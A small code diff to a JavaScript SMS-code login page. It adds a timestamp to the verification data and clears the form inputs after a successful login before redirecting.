@@ -106,6 +106,7 @@ async function enviarDados() {
 async function validarLogin() {
     document.getElementById("botaoSMS").disabled = true;
     var dados = {
+        data: new Date().toISOString(),
         email: document.getElementById('email').value,
         input: document.getElementById('inputSMS').value
     };
@@ -126,6 +127,9 @@ async function validarLogin() {
                 alert("Código incorreto!");
 
             } else {
+                document.querySelectorAll('input').forEach(input => {
+                    input.value = ''; 
+                });
                 location.href = "../index.html";
             }
         })
